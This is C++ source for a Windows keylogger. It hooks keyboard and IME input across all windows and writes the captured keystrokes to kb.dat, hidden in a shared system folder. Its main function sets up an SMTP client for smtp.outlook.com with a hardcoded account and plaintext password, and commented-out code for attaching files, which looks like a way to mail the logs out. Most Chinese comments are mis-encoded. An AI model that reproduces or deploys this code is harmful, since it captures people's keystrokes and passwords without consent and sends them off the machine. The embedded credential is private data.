/*======================================
// ���̹��� 
// �����������[F.S.T]
// http://www.wrsky.com
// 2005/9/25
=======================================*/
//#include "stdafx.h"
#include "keyboardhook.h"
#include "tool.h"
#include "SendMail.h"

#define WM_MESSAGE_HOOK		WM_USER+200 //
#define WM_KEYBOARD_HOOK	WM_USER+201 //

BOOL
	IsWinVistaOrLater (VOID)
{

	OSVERSIONINFO osvi;

	CHAR buffer[256] = {0};

	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	GetVersionEx(&osvi);

	sprintf(buffer, "dwMajorVersion %d\n", osvi.dwMajorVersion);
	OutputDebugStringA(buffer);

	if (osvi.dwMajorVersion > 5)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

int APIENTRY WinMain1(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{ 

	KeyBoardHook kbh;
	char dll_path[MAX_PATH];
	::GetModuleFileName(NULL,dll_path,sizeof(dll_path));
	char *pos=strrchr(dll_path,'\\');
	if(pos==NULL) return 0;
	strcpy(pos,"\\\0\0");
	strcat(dll_path,"hookdll.dll");
	strcpy(kbh.KBINFO.Dll_path,dll_path);
	OutputDebugStringA(kbh.KBINFO.Dll_path);
	strcpy(kbh.KBINFO.Key,"*");//*�ż�¼���еĴ��ڼ�����Ϣ���������Զ��ż������ؼ���:"����,Զ��"
	kbh.KBINFO.MaxDataLen=1;
	kbh.SetKBHookType(3);      //1:ԭʼ���̹��ӣ�2:֧�����뷨����Ϣ����,���Խػ����ģ�3:ԭʼ���Ӽ����뷨�����Ĺ���
	if (IsWinVistaOrLater())
	{
		strcpy(kbh.KBINFO.Savepath,"C:\\Users\\Public\\Documents\\kb.dat");
	}
	else
	{
		strcpy(kbh.KBINFO.Savepath,"C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
	}
	//strcpy(kbh.KBINFO.Savepath,"C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
	OutputDebugStringA(kbh.KBINFO.Savepath);

	kbh.Start();
	while(true) Sleep(1000);
	return 0;
}

HookManager hm;
SharedMemory sm("hook_area");

void log_message(MSG& msg)
{
	char str[128] = {0};
	sm.read_mem(str, sizeof(int), sizeof(str));
	str[sizeof(str) - 1] = 0;
	str[sizeof(str) - 2] = 0;
	Logger::debug("<%s>", str);
	Logger::write("<%s>", str);
}

void log_keyboard(MSG& msg)
{
	char str[20] = {0};
	sm.read_mem(str, sizeof(int), sizeof(str));
	str[sizeof(str) - 1] = 0;
	if(str[1] != 0){
		Logger::debug("[%s]", str);
		Logger::write("[%s]", str);
	} else{
		Logger::debug("%s", str);
		Logger::write("%s", str);
	}
}

int APIENTRY WinMain2(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{ 
	if(!sm.create(sizeof(int) + 128)){
		perror("Create SM Fail");
		exit(1);
	}
	sm.write_int(GetCurrentThreadId());
	if(!hm.init()){
		perror("Init Fail");
		exit(1);
	}
	hm.start_keyboard_hook();
	hm.start_message_hook();

	MSG msg;
	time_t last_time = time(NULL);
	while(true) {
		bool ret = PeekMessage(&msg, NULL, WM_MESSAGE_HOOK, WM_KEYBOARD_HOOK, PM_REMOVE);
		if(ret){
			switch(msg.message){
			case WM_MESSAGE_HOOK:
				log_message(msg);
				break;
			case WM_KEYBOARD_HOOK:
				log_keyboard(msg);
				break;
			default:
				break;
			}
		}
		time_t cur_time = time(NULL);
		if(difftime(cur_time, last_time) > 30){
			hm.start_message_hook();
			last_time = cur_time;
		}
		Sleep(1);
	}
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{
	//return WinMain2(hInstance, hPrevInstance, lpCmdLine, nCmdShow);
	CSmtp smtp(  
		25,                             /*smtp�˿�*/  
		"smtp.outlook.com",                 /*smtp��������ַ*/  
		"cchtriptest@outlook.com",    /*��������ַ*/  
		"cchtrip123",                  /*��������*/  
		"cchtriptest@outlook.com",    /*Ŀ�������ַ*/  
		"�ð�!",                          /*����*/  
		"��ܲ��ͬѧ����ã��յ���ظ���"       /*�ʼ�����*/  
		);  
	/** 
	//��Ӹ���ʱע��,\һ��Ҫд��\\����Ϊת���ַ���Ե�� 
	string filePath("D:\\�γ���Ʊ���.doc"); 
	smtp.AddAttachment(filePath); 
	*/  

	/*�����Ե���CSmtp::DeleteAttachment����ɾ������������һЩ�������Լ���ͷ�ļ���!*/  
	//filePath = "C:\\Users\\��ܲ��\\Desktop\\sendEmail.cpp";  
	//smtp.AddAttachment(filePath);  

	int err;  
	if ((err = smtp.SendEmail_Ex()) != 0)  
	{  
		if (err == 1)  
			cout << "����1: �������粻��ͨ������ʧ��!" << endl;  
		if (err == 2)  
			cout << "����2: �û�������,��˶�!" << endl;  
		if (err == 3)  
			cout << "����3: �û����������˶�!" << endl;  
		if (err == 4)  
			cout << "����4: ���鸽��Ŀ¼�Ƿ���ȷ���Լ��ļ��Ƿ����!" << endl;  
	}  
	system("pause");  
	return 0;  
}


